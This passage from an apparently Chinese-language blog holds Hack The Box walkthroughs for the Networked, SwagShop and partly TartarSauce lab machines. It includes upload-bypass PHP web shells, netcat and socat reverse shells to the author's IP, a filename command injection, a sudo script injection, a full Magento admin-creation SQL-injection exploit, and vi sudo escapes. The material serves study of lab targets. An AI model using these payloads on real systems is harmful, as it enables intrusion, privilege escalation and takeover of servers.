235, Words: 14, Lines: 8, Duration: 88ms] :: Progress: [30000/30000] :: Job [1/1] :: 2217 req/sec :: Duration: [0:00:22] :: Errors: 2 :: 有两个文件夹，一个 uploads，一个 backup 有一个备份文件，下载后解压看看 ┌──(root㉿kali)-[~/Desktop/backup] └─# ls -la 总计 36 drwxr-xr-x 2 root root 4096 2月26日 00:52 . drwxr-xr-x 3 root root 4096 2月26日 00:51 .. -rw-r--r-- 1 root root 10240 2019年 7月 9日 backup.tar -rw-r--r-- 1 root root 229 2月26日 00:52 index.php -rw-r--r-- 1 root root 2001 2月26日 00:52 lib.php -rw-r--r-- 1 root root 1871 2月26日 00:52 photos.php -rw-r--r-- 1 root root 1331 2月26日 00:52 upload.php 这边可以看到有几个文件，大概的逻辑可以理清了 通过 upload 上传文件，通过 photos 查看图片 //$name = $_SERVER[&#39;REMOTE_ADDR&#39;].&#39;-&#39;. $myFile[&quot;name&quot;]; list ($foo,$ext) = getnameUpload($myFile[&quot;name&quot;]); $validext = array(&#39;.jpg&#39;, &#39;.png&#39;, &#39;.gif&#39;, &#39;.jpeg&#39;); $valid = false; foreach ($validext as $vext) { if (substr_compare($myFile[&quot;name&quot;], $vext, -strlen($vext)) === 0) { $valid = true; 通过审计 upload.php 文件的代码，发现有白名单限制，只能上传 .jpg 、png 、.gif 、.jpeg 四个格式的文件 漏洞利用┌──(root㉿kali)-[~/Desktop/backup] └─# ls 1.jpg backup.tar index.php lib.php photos.php upload.php ┌──(root㉿kali)-[~/Desktop/backup] └─# cat 2.php php -r &#39;$sock=fsockopen(getenv(&quot;10.10.16.3&quot;),getenv(&quot;4444&quot;));exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39; 准备一张图片和一个 php 来制作 shell echo &#39;&lt;?php&#39; &gt;&gt; 1.jpg echo &#39;passthru(&quot;whoami&quot;);&#39; &gt;&gt; 1.jpg echo &#39;?&gt;&#39; &gt;&gt; 1.jpg mv 1.jpg 1.php.jpg 成功上传 可以看到我们上传的文件 确实被执行了，权限是 apache，我们去制作一下反弹的 shell mv 1.jpg shell.php.jpg echo &#39;&lt;?php&#39; &gt;&gt; shell.php.jpg echo &#39;passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.3 4444 &gt;/tmp/f&quot;);&#39; &gt;&gt; shell.php.jpg echo &#39;?&gt;&#39; &gt;&gt; shell.php.jpg nc -nvlp 4444 然后去上传 ┌──(root㉿kali)-[~/Desktop/backup] └─# rlwrap nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.146] 59222 sh: no job control in this shell sh-4.2$ whoami&amp;&amp;id whoami&amp;&amp;id apache uid=48(apache) gid=48(apache) groups=48(apache) 成功拿到 shell 权限提升Usersh-4.2$ ls -la ls -la total 28 drwxr-xr-x. 2 guly guly 4096 Sep 6 15:57 . drwxr-xr-x. 3 root root 18 Jul 2 2019 .. lrwxrwxrwx. 1 root root 9 Sep 7 13:05 .bash_history -&gt; /dev/null -rw-r--r--. 1 guly guly 18 Oct 30 2018 .bash_logout -rw-r--r--. 1 guly guly 193 Oct 30 2018 .bash_profile -rw-r--r--. 1 guly guly 231 Oct 30 2018 .bashrc -r--r--r--. 1 root root 782 Oct 30 2018 check_attack.php -rw-r--r-- 1 root root 44 Oct 30 2018 crontab.guly -r--------. 1 guly guly 33 Mar 6 12:51 user.txt 在 /home 下有一个用户 guly 然后在用户 guly 中有几个可读文件，挨个查看一下 sh-4.2$ cat check_attack.php cat check_attack.php &lt;?php require &#39;/var/www/html/lib.php&#39;; $path = &#39;/var/www/html/uploads/&#39;; $logpath = &#39;/tmp/attack.log&#39;; $to = &#39;guly&#39;; $msg= &#39;&#39;; $headers = &quot;X-Mailer: check_attack.php\\r\\n&quot;; $files = array(); $files = preg_grep(&#39;/^([^.])/&#39;, scandir($path)); foreach ($files as $key =&gt; $value) { $msg=&#39;&#39;; if ($value == &#39;index.html&#39;) { continue; } #echo &quot;-------------\\n&quot;; #print &quot;check: $value\\n&quot;; list ($name,$ext) = getnameCheck($value); $check = check_ip($name,$value); if (!($check[0])) { echo &quot;attack!\\n&quot;; # todo: attach file file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); echo &quot;rm -f $path$value\\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); } } ?&gt; sh-4.2$ cat crontab.guly cat crontab.guly */3 * * * * php /home/guly/check_attack.php 从 crontab.guly 里可以看到，每三分钟会执行一次 check_attack.php 这里会引入一个库文件 /var/www/html/lib.php 但是可惜的是，我们没有权限修改它 但是有一个点我发现是可控的，上传文件夹中的文件名($value)是可控的 那么首先，我们创建一个空的测试文件，并将它放入上传文件夹中 cd /var/www/html/uploads touch &quot;test.txt&quot; 现在我们将“test.txt”分配给 $value，执行 php 脚本并查看输出 php /home/guly/check_attack.php sh-4.2$ php /home/guly/check_attack.php php /home/guly/check_attack.php attack! rm -f /var/www/html/uploads/test.txt 这表明文件名（$value）附加到 “&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads” 的末尾。 所以在代码中，我们可以完全控制的部分是 “rm -f &#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;test.txt” 在脚本中，我正在操控的代码是 exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); 所以我准备创建一个以分号开头并以命令结尾的文件名，来自定义执行我们的 php exec() 函数 exec(&quot;nohup /bin/rm -f $path ; command-to-inject &gt; /dev/null 2&gt;&amp;1 &amp;&quot;); ok，我们正式开始 touch &quot;; nc 10.10.16.3 5555 -e &#39;/bin/bash&#39;&quot; sh-4.2$ touch &quot;; nc 10.10.16.3 5555 -e &#39;/bin/bash&#39;&quot; touch &quot;; nc 10.10.16.3 5555 -e &#39;/bin/bash&#39;&quot; touch: cannot touch &#39;; nc 10.10.16.3 5555 -e \\&#39;/bin/bash\\&#39;&#39;: No such file or directory 这边似乎用 netcat 执行比较麻烦，反斜杠的原因吧，懒得弄编码了，用 socat 试试吧 socat file:`tty`,raw,echo=0 tcp-listen:5555 然后去创建我们的文件名 touch &quot;; socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555&quot; 然后再去执行一下 php 脚本 php /home/guly/check_attack.php sh-4.2$ php /home/guly/check_attack.php php /home/guly/check_attack.php attack! /bin/rm: cannot remove &#39;/var/www/html/uploads/&#39;: Is a directory rm -f /var/www/html/uploads/; socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:10.10.16.3:5555 ┌──(root㉿kali)-[~/Desktop] └─# socat file:`tty`,raw,echo=0 tcp-listen:5555 bash-4.2$ whoami&amp;&amp;id apache uid=48(apache) gid=48(apache) groups=48(apache) 这边确实可以被执行，由于是我们调用的，所以还是 apache 权限，所以我们现在去让脚本自动执行吧 ┌──(root㉿kali)-[~/Desktop] └─# socat file:`tty`,raw,echo=0 tcp-listen:5555 [guly@networked ~]$ whoami&amp;&amp;id guly uid=1000(guly) gid=1000(guly) groups=1000(guly) 成功拿到 user 权限的 flag 文件 [guly@networked ~]$ cat user.txt c41daff87304452dde58eae1751e49b6 成功拿到 user 权限的 flag 文件 Root[guly@networked ~]$ sudo -l Matching Defaults entries for guly on networked: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User guly may run the following commands on networked: (root) NOPASSWD: /usr/local/sbin/changename.sh 可以调用 root 权限执行 /usr/local/sbin/changename.sh 脚本，先去看看是什么权限还有干什么的 [guly@networked ~]$ ls -la /usr/local/sbin/changename.sh -rwxr-xr-x 1 root root 422 Jul 8 2019 /usr/local/sbin/changename.sh [guly@networked ~]$ cat /usr/local/sbin/changename.sh #!/bin/bash -p cat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF regexp=&quot;^[a-zA-Z0-9_\\ /-]+$&quot; for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo &quot;interface $var:&quot; read x while [[ ! $x =~ $regexp ]]; do echo &quot;wrong input, try again&quot; echo &quot;interface $var:&quot; read x done echo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-guly done /sbin/ifup guly0 这里找到一篇参考文章 https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&amp;qid&#x3D;e026a0c5f83df4fd532442e1324ffa4f 这里大概意思是在执行 /usr/local/sbin/changename.sh 脚本后，会让我们输入四个参数，其中的 name 参数我们是可以注入命令的 我们去执行 [guly@networked ~]$ sudo /usr/local/sbin/changename.sh interface NAME: test bash interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: wrong input, try again interface PROXY_METHOD: ^C [guly@networked ~]$ clear TERM environment variable not set. [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ [guly@networked ~]$ sudo /usr/local/sbin/changename.sh interface NAME: test bash interface PROXY_METHOD: test interface BROWSER_ONLY: test interface BOOTPROTO: test [root@networked network-scripts]# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 [root@networked network-scripts]# cat /root/root.txt ff05b3ceb986ab66f5728c7cb82e67de 成功获得 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"SwagShop - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-SwagShop","date":"2023-02-17T11:38:36.000Z","updated":"2023-06-13T03:53:09.000Z","comments":true,"path":"2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/","link":"","permalink":"http://www.lucifiel.com/2023/02/17/Hackthebox/Easy/Hackthebox-SwagShop/","excerpt":"","text":"Hackthebox - SwagShop靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.140 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-17 02:26 CST Warning: 10.10.10.140 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.140 Host is up (0.078s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 b6552bd24e8fa3817261379a12f624ec (RSA) | 256 2e30007a92f0893059c17756ad51c0ba (ECDSA) |_ 256 4c50d5f270c5fdc4b2f0bc4220326434 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Did not follow redirect to http://swagshop.htb/ |_http-server-header: Apache/2.4.18 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=2/17%OT=22%CT=1%CU=30863%PV=Y%DS=2%DC=T%G=Y%TM=63EE758 OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=8)OPS OS:(O1=M537ST11NW7%O2=M537ST11NW7%O3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST1 OS:1NW7%O6=M537ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN OS:(R=Y%DF=Y%T=40%W=7210%O=M537NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 993/tcp) HOP RTT ADDRESS 1 117.05 ms 10.10.16.1 2 76.51 ms 10.10.10.140 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.68 seconds Http这边 http 会跳转到域名 swagshop.htb ，去加入一个 hosts 解析 echo 10.10.10.140 swagshop.htb &gt;&gt; /etc/hosts 似乎是一个商城，底部可以发现这是 2014 年版本的 Magento 去搜索一下是否有漏洞 ┌──(root㉿kali)-[~/Desktop] └─# searchsploit magento --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection | php/webapps/38573.txt eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service) | php/webapps/38651.txt Magento 1.2 - &#39;/app/code/core/Mage/Admin/Model/Session.php?login[&#39;Username&#39;]&#39; Cross-Site Scripting | php/webapps/32808.txt Magento 1.2 - &#39;/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email&#39; Cross-Site Scripting | php/webapps/32809.txt Magento 1.2 - &#39;downloader/index.php&#39; Cross-Site Scripting | php/webapps/32810.txt Magento &lt; 2.0.6 - Arbitrary Unserialize / Arbitrary Write File | php/webapps/39838.php Magento CE &lt; 1.9.0.1 - (Authenticated) Remote Code Execution | php/webapps/37811.py Magento eCommerce - Local File Disclosure | php/webapps/19793.txt Magento eCommerce - Remote Code Execution | xml/webapps/37977.py Magento eCommerce CE v2.3.5-p2 - Blind SQLi | php/webapps/50896.txt Magento Server MAGMI Plugin - Multiple Vulnerabilities | php/webapps/35996.txt Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion | php/webapps/35052.txt Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass | php/webapps/48135.php --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 这边发现有一个 RCE 的漏洞 漏洞利用拷贝到本地后去查看一下 import requests import base64 import sys target = &quot;http://target.com/&quot; if not target.startswith(&quot;http&quot;): target = &quot;http://&quot; + target if target.endswith(&quot;/&quot;): target = target[:-1] target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot; q=&quot;&quot;&quot; SET @SALT = &#39;rp&#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;); &quot;&quot;&quot; query = q.replace(&quot;\\n&quot;, &quot;&quot;).format(username=&quot;forme&quot;, password=&quot;forme&quot;) pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query) # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}} r = requests.post(target_url, data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;, &quot;filter&quot;: base64.b64encode(pfilter), &quot;forwarded&quot;: 1}) if r.ok: print &quot;WORKED&quot; print &quot;Check {0}/admin with creds forme:forme&quot;.format(target) else: print &quot;DID NOT WORK&quot; import requests import base64 import sys target = &quot;http://swagshop.htb/index.php&quot; if not target.startswith(&quot;http&quot;): target = &quot;http://&quot; + target if target.endswith(&quot;/&quot;): target = target[:-1] target_url = target + &quot;/admin/Cms_Wysiwyg/directive/index/&quot; q=&quot;&quot;&quot; SET @SALT = &#39;rp&#39;; SET @PASS = CONCAT(MD5(CONCAT( @SALT , &#39;{password}&#39;) ), CONCAT(&#39;:&#39;, @SALT )); SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL; INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES (&#39;Firstname&#39;,&#39;Lastname&#39;,&#39;email@example.com&#39;,&#39;{username}&#39;,@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW()); INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,&#39;U&#39;,(SELECT user_id FROM admin_user WHERE username = &#39;{username}&#39;),&#39;Firstname&#39;); &quot;&quot;&quot; query = q.replace(&quot;\\n&quot;, &quot;&quot;).format(username=&quot;lucifiel&quot;, password=&quot;lucifiel&quot;) pfilter = &quot;popularity[from]=0&amp;popularity[to]=3&amp;popularity[field_expr]=0);{0}&quot;.format(query) # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}} r = requests.post(target_url, data={&quot;___directive&quot;: &quot;e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&quot;, &quot;filter&quot;: base64.b64encode(pfilter), &quot;forwarded&quot;: 1}) if r.ok: print &quot;WORKED&quot; print &quot;Check {0}/admin with creds lucifiel:lucifiel&quot;.format(target) else: print &quot;DID NOT WORK&quot; 根据我们需要的进行修改，将第五行的地址更改为 http://swagshop.htb/index.php ，将第二十四行的账号密码更改为我们需要的账号密码 ┌──(root㉿kali)-[~/Desktop] └─# python2 exploit.py WORKED Check http://swagshop.htb/index.php/admin with creds lucifiel:lucifiel 然后去进行登录 成功登录 https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper 通过翻找，找到了一篇漏洞相关的文档 这里依次点击 System –&gt; Configuration –&gt; Advanced –&gt; Developer –&gt; Template Settings –&gt; Allow Symlinks 然后将它设置为 yes，然后点击 save config 保存 接着制作图片马 echo &#39;&lt;?php&#39; &gt;&gt; shell.php.png echo &#39;passthru(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.7 4444 &gt;/tmp/f&quot;);&#39;&gt;&gt; shell.php.png echo &#39;?&gt;&#39; &gt;&gt; shell.php.png 然后再依次点击 Catalog -&gt; Manager Categories 进行上传 然后去查看，会发现我们的图片已经传上去了 最后一步是创建通讯模板兵注入我们的 payload 点击 Newsletter -&gt; Newsletter Templates -&gt; Add New Template {{block type='core/template' template='../../../../../../media/catalog/category/shell.php.png'}} 这是我们要填入的内容 然后使用 nc 监听一个端口 最后我们点击 Preview Template 预览模板 ┌──(root㉿kali)-[~/Desktop] └─# rlwrap nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.7] from (UNKNOWN) [10.10.10.140] 33206 /bin/sh: 0: can&#39;t access tty; job control turned off $ whoami&amp;&amp;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) 得到了一个 shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;; 权限提升$ sudo -l Matching Defaults entries for www-data on swagshop: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on swagshop: (root) NOPASSWD: /usr/bin/vi /var/www/html/* 我们可以使用 root 权限调用 &#x2F;sur&#x2F;bin&#x2F;vi 执行所有 &#x2F;var&#x2F;www&#x2F;html&#x2F;* 的文件 $ ls -la /var/www/html/ total 720 drwxr-xr-x 12 www-data www-data 4096 Nov 12 2021 . drwxr-xr-x 3 root root 4096 Nov 12 2021 .. -rw-r--r-- 1 www-data www-data 5667 May 7 2014 .htaccess -rw-r--r-- 1 www-data www-data 4568 May 7 2014 .htaccess.sample -rw-r--r-- 1 www-data www-data 10679 May 7 2014 LICENSE.html -rw-r--r-- 1 www-data www-data 10410 May 7 2014 LICENSE.txt -rw-r--r-- 1 www-data www-data 10421 May 7 2014 LICENSE_AFL.txt -rw-r--r-- 1 www-data www-data 585086 May 7 2014 RELEASE_NOTES.txt -rw-r--r-- 1 www-data www-data 2834 May 7 2014 api.php drwxr-xr-x 6 www-data www-data 4096 Nov 12 2021 app -rw-r--r-- 1 www-data www-data 2831 May 7 2014 cron.php -rw-r--r-- 1 www-data www-data 717 May 7 2014 cron.sh drwxr-xr-x 3 www-data www-data 4096 Nov 12 2021 errors -rw-r--r-- 1 www-data www-data 1150 May 7 2014 favicon.ico -rw-r--r-- 1 www-data www-data 5979 May 7 2014 get.php drwxr-xr-x 2 www-data www-data 4096 Nov 12 2021 includes -rw-r--r-- 1 www-data www-data 2642 May 7 2014 index.php -rw-r--r-- 1 www-data www-data 2366 May 7 2014 index.php.sample -rw-r--r-- 1 www-data www-data 6441 May 7 2014 install.php drwxr-xr-x 12 www-data www-data 4096 Nov 12 2021 js drwxr-xr-x 13 www-data www-data 4096 Nov 12 2021 lib -rw-r--r-- 1 www-data www-data 1319 May 7 2014 mage drwxrwxrwx 8 www-data www-data 4096 Nov 12 2021 media -rw-r--r-- 1 www-data www-data 886 May 7 2014 php.ini.sample drwxr-xr-x 2 www-data www-data 4096 Nov 12 2021 pkginfo drwxr-xr-x 2 www-data www-data 4096 Nov 12 2021 shell drwxr-xr-x 5 www-data www-data 4096 Nov 12 2021 skin drwxr-xr-x 10 www-data www-data 4096 Feb 16 13:54 var 我们可以看到，/var/www/html/ 目录下的东西还是挺多的 https://gtfobins.github.io/gtfobins/vi/ 根据 GTFOBins 上的提示，我们在 vi 编辑中，使用 :shell 即可获得权限 那我们去随便执行一个吧 sudo /usr/bin/vi /var/www/html/index.php 执行后按 ESC，然后输入 :shell 即可 root@swagshop:/var/www/html# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) 成功提权到 root 权限 root@swagshop:/var/www/html# cat /home/haris/user.txt cat /home/haris/user.txt 370cc7d01561ab4da02e53de7ef8d799 成功拿到 user 权限的 flag 文件 root@swagshop:/var/www/html# cat /root/root.txt cat /root/root.txt 295e684ef53b47af9e6fc69a3301ee26 成功拿到 root 权限的 flag 文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"TartarSauce - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-TartarSauce","date":"2023-02-11T11:38:36.000Z","updated":"2023-06-13T03:53:17.000Z","comments":true,"path":"2023/02/11/Hackthebox/Medium/Hackthebox-TartarSauce/","link":"","permalink":"http://www.lucifiel.com/2023/02/11/Hackthebox/Medium/Hackthebox-TartarSauce/","excerpt":"","text":"Hackthebox - TartarSauce靶场信息 靶场类型 信息收集Nmap┌──(root㉿kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 10000 10.10.10.88 Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 20:30 CST Warning: 10.10.10.88 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.88 Host is up (0.095s latency). Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-robots.txt: 5 disallowed entries | /webservices/tar/tar/source/ | /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ |_/webservices/developmental/ /webservices/phpmyadmin/ |_http-title: Landing Page |_http-server-header: Apache/2.4.18 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.93%E=4%D=2/11%OT=80%CT=1%CU=43534%PV=Y%DS=2%DC=T%G=Y%TM=63E78A9 OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SEQ OS:(SP=108%GCD=1%ISR=10D%TI=Z%II=I%TS=A)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O OS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=7120%W2= OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M537NNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 256/tcp) HOP RTT ADDRESS 1 117.74 ms 10.10.16.1 2 74.70 ms 10.10.10.88 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 44.31 seconds Http 这什么玩意儿，虽然知道是字符组成的图案，但是我确实看不出来是啥 &lt;!--Carry on, nothing to see here :D--&gt; 源代码拉到最底下，有一句这里没什么好看的，挺皮的 /webservices/tar/tar/source/ /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ /webservices/developmental/ /webservices/phpmyadmin/ 在 nmap 扫描的时候，有几个目录，挨个去看一下 http://10.10.10.88/webservices/monstra-3.0.4/ 然后只有这一个地址可以访问 ┌──(root㉿kali)-[~/Desktop] └─# searchsploit monstra 3.0.4 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution | php/webapps/43348.txt Monstra CMS 3.0.4 - Arbitrary Folder Deletion | php/webapps/44512.txt Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload | php/webapps/48479.txt Monstra cms 3.0.4 - Persitent Cross-Site Scripting | php/webapps/44502.txt Monstra CMS 3.0.4 - Remote Code Execution (Authenticated) | php/webapps/49949.py Monstra CMS &lt; 3.0.4 - Cross-Site Scripting (1) | php/webapps/44855.py Monstra CMS &lt; 3.0.4 - Cross-Site Scripting (2) | php/webapps/44646.txt Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking) | php/webapps/45164.txt --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results 这个版本的 Monstra CMS 确实是可以搜索到漏洞，这个先不急着看 点击首页的登录，可以进入登录页面 弱口令 admin&#x2F;admin 成功登录 根据我们找到的几个漏洞，其中一个为文件上传，我 exploit 利用没成功，我去手动试试 点击 Dashboard -&gt; upload file -&gt; select file -&gt; upload 这里利用没有成功，我又琢磨了一阵，发现是个兔子洞 Fuzz┌──(root㉿kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.10.88/webservices/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.10.88/webservices/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt :: Follow redirects : false :: 